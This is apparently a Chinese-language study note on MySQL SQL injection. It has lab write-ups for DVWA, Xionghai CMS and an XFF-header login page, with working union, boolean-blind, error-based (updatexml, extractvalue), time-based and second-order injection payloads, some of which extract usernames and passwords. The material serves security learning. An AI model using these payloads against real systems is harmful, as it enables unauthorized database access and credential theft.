---
{"date":"2024-07-26","tags":["xiaodi"],"url":null,"dg-publish":true,"permalink":"/随记/WEB攻防_SQL注入_{2024-07-26}/","dgPassFrontmatter":true}
---


```table-of-contents
```


# 数据库框架

+ maysql
	+ ==**数据库A**==
		+ **表a**
			+ 列名1
				+ 数据
			+ 列名2
				+ 数据
		+ **表b**
			+ 列名1
				+ 数据
			+ 列名2
				+ 数据
	+ ==**数据库B**==
		+ **表c**
			+ 列名1
				+ 数据
			+ 列名2
				+ 数据
		+ **表d**
			+ 列名1
				+ 数据
			+ 列名2
				+ 数据


## 保存关键信息数据库

在mysql数据库中，有一个固定的数据库**information_schema**保存着有关数据库的很多信息

+ **表SCHEMATA**(5列)
	+ 保存着所有数据库名称
	+ 关键列：SCHEMA_NAME
![Pasted image 20240726111753.png](/img/user/picture/Pasted%20image%2020240726111753.png)

+ **表TABLES**
	+ 记录**表名信息**的表
	+ 关键列：TABLE_SCHEMA、TABLE_NAME
![Pasted image 20240726112739.png](/img/user/picture/Pasted%20image%2020240726112739.png)


+ **表columns**
	+ 记录**列名**信息表
	+ 关键列：TABLE_SCHEMA、TABLE_NAME、COLUMN_NAME
![Pasted image 20240726113023.png](/img/user/picture/Pasted%20image%2020240726113023.png)

# SQL注入类型

+ 基于正常回显
	联合查询 union select
	
+ 盲注
	+ 布尔型盲注
    + 基于时间盲注sleep()
    + 基于错误回显
	    floor()
	    extractvalue()
	　　updatexml()





# masql 常规注入查询

获取相关数据：

1、数据库版本-看是否符合information_schema查询-version()
低版本没有information_schema数据库

2、数据库用户-看是否符合ROOT型注入攻击-user()

3、当前操作系统-看是否支持大小写或文件路径选择-@@version_compile_os

4、数据库名字-为后期猜解指定数据库下的表，列做准备-database()



<div class="transclusion internal-embed is-loaded"><a class="markdown-embed-link" href="//xff-2024-07-30/" aria-label="Open link"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-link"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a><div class="markdown-embed">




进去是一个登陆界面
![Pasted image 20240730155230.png](/img/user/picture/Pasted%20image%2020240730155230.png)



随便输一个抓包发现发现会返回ip地址
![Pasted image 20240730155348.png](/img/user/picture/Pasted%20image%2020240730155348.png)
![Pasted image 20240730155356.png](/img/user/picture/Pasted%20image%2020240730155356.png)

这里猜测他在代码中应该是有获取我们ip地址的操作，然后会代入数据库进行查询，所以我们试一下添加XFF头会不会带入查询
`X-Forwarded-For:`


![Pasted image 20240730160041.png](/img/user/picture/Pasted%20image%2020240730160041.png)
![Pasted image 20240730160050.png](/img/user/picture/Pasted%20image%2020240730160050.png)
发现他确实有返回123

加上单引号有报错
![Pasted image 20240730160219.png](/img/user/picture/Pasted%20image%2020240730160219.png)
![Pasted image 20240730160212.png](/img/user/picture/Pasted%20image%2020240730160212.png)

则这里就是一个出入点
开始利用XFF头进行注入



获取到数据库名称
`',updatexml(1,concat(0x7e,(select database()),0x7e),1))#`
![Pasted image 20240730160332.png](/img/user/picture/Pasted%20image%2020240730160332.png)


获取到表名
```sql
' or updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema='webcalendar'),0x7e),1))#
```

![Pasted image 20240730160442.png](/img/user/picture/Pasted%20image%2020240730160442.png)


获取到字段名
```sql
' or updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_name='user'),0x7e),1))#
```
![Pasted image 20240730160522.png](/img/user/picture/Pasted%20image%2020240730160522.png)


最后获取到数据是账号和密码
```sql
' or updatexml(1,concat(0x7e,(select group_concat(username,':',password)from user limit 0,1),0x7e),1))#
```
![Pasted image 20240730160558.png](/img/user/picture/Pasted%20image%2020240730160558.png)



![Pasted image 20240730160643.png](/img/user/picture/Pasted%20image%2020240730160643.png)





</div></div>


# SQL盲注

## 布尔盲注报错

基于布尔型SQL盲注即在SQL注入过程中，应用程序仅仅返回`True`（页面）和`False`（页面）。
这时，我们无法根据应用程序的返回页面得到我们需要的数据库信息。但是可以通过构造逻辑判断（比较大小）来得到我们需要的信息。

>[!note]
>*也就是我们注入查询的结果没有办法直接显示，所以我们可以依靠来构造查语句的**正确性**来**猜测爆破**信息*

常用语句：

```sql
and length(database())=7;

and left(database(),1)='p';

and left(database(),2)='pi';

and substr(database(),1,1)='p';

and substr(database(),2,1)='i';

and ord(left(database(),1))=112;
```




### practice-DVWA


<div class="transclusion internal-embed is-loaded"><a class="markdown-embed-link" href="//dvwa-sql-easy-2024-07-31/" aria-label="Open link"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-link"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a><div class="markdown-embed">




```table-of-contents
```
界面就一个输入框，要求输入ID
![Pasted image 20240731182251.png](/img/user/picture/Pasted%20image%2020240731182251.png)

当能在数据库中搜索到这个ID时则会返回
`User ID exists in the database.`     ->    ture
 
否则则会返回
`User ID is MISSING from the database.`   ->    false

# 布尔盲注

他的php源码查询语句如下：
```php
`$query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";`
```
也就是会将id带入查询，之后如果有查询结果，则会返回第一条语句，如果查询结果为空，则会返回第二条语句
**满足布尔注入条件**



## 获取数据库名


输入  为ture
```sql
1'  and length(database())=4 #
```
则可知数据库名称长度为4

> [!NOTE] 利用函数
> `length(database())`


**接下来来逐个字母破解数据库名称**
> [!NOTE] 利用函数
> `left(database(),1)='p'`
> 或者
> `substr(database(),1,1)='p'`
> 或者
> `ascii(substr(database(),1,1))`
>> [!example] ⼆分法逐字猜解 
>>  `1' and ascii(substr(database(),1,1))>97 #`，显⽰存在，说明数据库名的第⼀个字符的ascii值⼤于 97（⼩写字母a的ascii值）； 
>>  `1' and ascii(substr(database(),1,1))<122 #`，显⽰存在，说明数据库名的第⼀个字符的ascii值⼩于 122（⼩写字母z的ascii值）； 
>>  `1' and ascii(substr(database(),1,1))<109 #`，显⽰存在，说明数据库名的第⼀个字符的ascii值⼩于 109（⼩写字母m的ascii值） 
>>  `1' and ascii(substr(database(),1,1))<103 #`，显⽰存在，说明数据库名的第⼀个字符的ascii值⼩于 103（⼩写字母g的ascii值）； 
>>  `1' and ascii(substr(database(),1,1))<100 #`，显⽰不存在，说明数据库名的第⼀个字符的ascii值不 ⼩于100（⼩写字母d的ascii值）； 
>>  `1' and ascii(substr(database(),1,1))=100 #`，显⽰存在，说明数据库名的第⼀个字符的ascii值等于100（⼩写字母d的ascii值），所以数据库名的第⼀个字符的ascii值为100，即⼩写字母d。 
>>  重复以上步骤直到得出完整的数据库名dvwa 


输入下面内容时返回为ture
```
1'  and left(database(),1)='d' # 

1'  and left(database(),2)='dv' #

1'  and left(database(),3)='dvw' #

1'  and left(database(),4)='dvwa' #
```
则可知数据库名为`dvwa`


## 猜解表名

首先来猜解表的个数
```js
1' and (select count(table_name) from information_schema.tables where table_schema=database())=1 # 
显⽰不存在 


1' and (select count(table_name) from information_schema.tables where table_schema=database())=2 # 
显⽰存在 
```

> [!note] 
> 原理是使用count()这个函数来判断table_name这个表的数量有几个 然后后面有一个where判断来指定是当前数据库 在末尾有一个 =1 ，意思是判断表有1个，正确那么页面返回正常，错误即返回不正常

我们判断出当前数据库名下的表有两个


**猜解表名长度:**

```js
1' and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))=9 #
显⽰存在

1' and length((select table_name from information_schema.tables where table_schema=database() limit 1,1))=5 #
显⽰存在
```

> [!note] 
> ```js
> length(
> 	(select table_name from information_schema.tables where table_schema=database() limit 0,1)
> 	)=9
> 
>```
> 注意：
> `length`函数的参数应该是一个字符串
> 	`limit 0,1`：限制结果，只返回第一行。这是一个偏移量为0（即从第0行开始），获取1行的限制条件。因此，子查询返回的是当前数据库中的第一个表名。

说明两个表名长度分别是5和9


下面猜解两个表名
```js
1' and left((select table_name from information_schema.tables where table_schema=database() limit 0,1),1)='g' # 
显⽰存在


1' and left((select table_name from information_schema.tables where table_schema=database() limit 0,1),2)='gu' # 
显⽰存在

...


1' and left((select table_name from information_schema.tables where table_schema=database() limit 0,1),9)='guestbook' # 
显⽰存在
```

第一个表明为guestbook


```js
1' and left((select table_name from information_schema.tables where table_schema=database() limit 1,1),1)='u' # 
显⽰存在


1' and left((select table_name from information_schema.tables where table_schema=database() limit 1,1),2)='us' # 
显⽰存在

...

1' and left((select table_name from information_schema.tables where table_schema=database() limit 1,1),5)='users' # 
显⽰存在
```
第一个表明为users




**下面的内容大同小异，就不再过多赘述**

## 猜解表中的字段名




## 猜解数据




</div></div>



## 报错盲注

**使SQL语句报错的语法，用于注入结果无回显但错误信息有输出的情况。**

### 通过UpdateXml报错

```sql
and updatexml(1,concat(0x7e,(SELECT version()),0x7e),1)
```


### 通过ExtractValue报错

```sql
and extractvalue(1, concat(0x7e,(SELECT version()),0x7e))
```


### 通过floor报错

```sql
//没看懂
```


<div class="transclusion internal-embed is-loaded"><a class="markdown-embed-link" href="//sql-2024-08-01/" aria-label="Open link"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-link"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a><div class="markdown-embed">




```table-of-contents
```
# 环境介绍

利用的是熊海CMS


在 `files/submit.php` 提交评论的文件中，有这样的代码
```php
$query = "INSERT INTO interaction (  
type,  
xs,  
cid,  
name,  
mail,  
url,  
touxiang,  
shebei,  
ip,  
content,  
tz,  
date  
) VALUES (  
'$type',  
'$xs',  
'$cid',  
'$name',  
'$mail',  
'$url',  
'$touxiang',  
'$shebei',  
'$ip',  
'$content',  
'$tz',  
now()  
)";  
@mysql_query($query) or die('新增错误：'.mysql_error());
```

也就是接收评论的信息然后插入数据库，最重要的是后面有报错返回

# 进行注入

接下来尝试将昵称改为payload

```sql
' and updatexml(1,concat(0x7e,(SELECT version()),0x7e),1) and '
```
注意要闭合单引号


![Pasted image 20240801105510.png](/img/user/picture/Pasted%20image%2020240801105510.png)

发现确实可以注入


## 获取数据库名

```sql
' and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1) and '
```
![Pasted image 20240801105955.png](/img/user/picture/Pasted%20image%2020240801105955.png)

## 获取表名

构建payload
```sql
' and updatexml(1,concat(0x7e,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),0x7e),1) and '

```
`LIMIT 0,1` 用于逐步获取表名。你可以从 `LIMIT 0,1` 开始，逐步增加偏移量来获取更多的表名，例如 `LIMIT 1,1`、`LIMIT 2,1` 等。
![Pasted image 20240801114453.png](/img/user/picture/Pasted%20image%2020240801114453.png)

## 获取列名

以表`manang`为例

```sql
' and updatexml(1,concat(0x7e,(SELECT column_name FROM information_schema.columns WHERE table_name='manage' LIMIT 0,1),0x7e),1) and '

```

![Pasted image 20240801115106.png](/img/user/picture/Pasted%20image%2020240801115106.png)

得到列名
id,user,name,password,img,mail



## 表中信息

```sql
' and updatexml(1,concat(0x7e,(SELECT name FROM seacms.manage WHERE id='1' LIMIT 0,1),0x7e),1) and '
```

![Pasted image 20240801115533.png](/img/user/picture/Pasted%20image%2020240801115533.png)

发现在显示密码的时候显示不全
```sql
' and extractvalue(1, concat(0x7e, (SELECT password FROM seacms.manage WHERE id='1' LIMIT 0,1), 0x7e)) and '
```

</div></div>



https://juejin.cn/post/7156744293988696095
https://www.jianshu.com/p/bc35f8dd4f7c

## 延迟盲注

```sql
and if(1=1,sleep(5),0)

or if(1=1,sleep(5),0)

or if(ord(left(database(),1))=107,sleep(2),0)
```




# 二次注入

二次注入可以理解为，**攻击者构造的恶意数据存储在数据库**后，**恶意数据被读取并进入到SQL查询语句**所导致的注入。防御者即使对用户输入的恶意数据进行**转义**，当数据插入到数据库中时被处理的数据又被还原，Web程序调用存储在数据库中的恶意数据并执行SQL查询时，就发生了SQL二次注入。

也就是说一次攻击造成不了什么，但是两次配合起来就会早成注入漏洞。



![Pasted image 20240802112705.png](/img/user/picture/Pasted%20image%2020240802112705.png)




<div class="transclusion internal-embed is-loaded"><a class="markdown-embed-link" href="//2024-08-02/" aria-label="Open link"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-link"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a><div class="markdown-embed">




```table-of-contents
```

# 整理思路

在注册用户这一步会将信息进行一步转义处理，导致没法直接在注册的时候进行注入，但是他会将还原后的数据插入到数据库中，然后就可以尝试在修改密码这一步进行利用



![Pasted image 20240802151421.png](/img/user/picture/Pasted%20image%2020240802151421.png)
在这里`addslashes()`函数就是对原本数据进行转义


![Pasted image 20240802151820.png](/img/user/picture/Pasted%20image%2020240802151820.png)
这里是在修改密码的时候进行的SQL处理，可以利用报错注入


# 简单注入测试

我们想要他执行下面这个语句
`SELECT * FROM users WHERE username = 'admin' and updatexml(1,concat(0x7e,(SELECT version()),0x7e),1)#`


也就是需要将用户名构造为
`admin' and updatexml(1,concat(0x7e,(SELECT version()),0x7e),1)#`

![Pasted image 20240802152725.png](/img/user/picture/Pasted%20image%2020240802152725.png)



可以看到确实能注入
![Pasted image 20240802152820.png](/img/user/picture/Pasted%20image%2020240802152820.png)




# 总结

这个环境其实太简陋了，正常情况下对用户名和密码什么要求还是挺高的，比如限制长度字符什么的，但是这个环境也能很好体现二次注入的思想了

对于这种，其实防护也很简单，**对输入一视同仁，无论输入来自用户还是存储，在进入到 SQL 查询前都对其进行过滤、转义。**


</div></div>
